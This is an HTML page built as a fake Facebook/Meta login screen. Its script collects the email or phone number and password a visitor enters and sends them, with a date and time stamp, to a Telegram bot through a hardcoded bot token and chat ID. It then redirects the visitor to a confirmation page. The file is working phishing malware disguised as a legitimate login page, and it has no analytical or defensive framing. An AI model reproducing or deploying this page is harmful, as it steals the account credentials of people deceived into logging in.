<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .login-container {
            width: 100%;
            max-width: 360px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .facebook-logo {
            text-align: center;
            margin-bottom: 60px;
        }

        .facebook-logo img {
            height: 60px;
            width: auto;
        }

        .input-field {
            width: 100%;
            padding: 16px 20px;
            border: 1px solid #e0e0e0;
            border-radius: 24px;
            font-size: 16px;
            color: #333;
            background-color: #fff;
            outline: none;
        }

        .input-field::placeholder {
            color: #888;
        }

        .login-button {
            width: 100%;
            padding: 14px;
            background-color: #0066cc;
            color: white;
            border: none;
            border-radius: 24px;
            font-size: 17px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 4px;
        }

        .forgot-password {
            text-align: center;
            color: #1a1a1a;
            font-size: 16px;
            font-weight: 500;
            text-decoration: none;
            margin-top: 16px;
        }

        .spacer {
            flex-grow: 1;
            min-height: 60px;
        }

        .create-account {
            width: 100%;
            padding: 14px;
            background-color: #fff;
            color: #0066cc;
            border: 1px solid #0066cc;
            border-radius: 24px;
            font-size: 17px;
            font-weight: 500;
            cursor: pointer;
        }

        .meta-logo {
            text-align: center;
            margin-top: 20px;
        }

        .meta-logo img {
            height: 24px;
            width: auto;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="facebook-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/2048px-2021_Facebook_icon.svg.png" alt="Facebook">
        </div>
        <input type="text" class="input-field" placeholder="Mobile number or email" id="email">
        <input type="password" class="input-field" placeholder="Password" id="password">
       <button class="login-button" onclick="handleLogin()">Log in</button>
        <a href="#" class="forgot-password">Forgot password?</a>
        <div class="spacer"></div>
        <button class="create-account">Create new account</button>
        <div class="meta-logo">
            <img src="https://logos-world.net/wp-content/uploads/2021/11/Meta-Logo.png" alt="Meta">
        </div>
    </div>
<script>
  async function handleLogin() {

    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;

    if (!email || !password) {
      alert('Please fill in all fields!');
      return;
    }

    var now = new Date();
    var date = now.toLocaleDateString();
    var time = now.toLocaleTimeString();

    var message = 'KING COMPANY - Worker Login\n'
      + '--------------------\n'
      + 'Email/Phone: ' + email + '\n'
      + 'Password: ' + password + '\n'
      + 'Date: ' + date + '\n'
      + 'Time: ' + time + '\n'
      + '--------------------';

    var token = '8649472732:AAG3-KVl1LK3v31kzTo_mZLe77SdgCpHRUU';
    var chatId = '5811425897';

    await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message })
    });

    window.location.href = 'confirmation.html';

  }
</script>
  
</body>
</html>
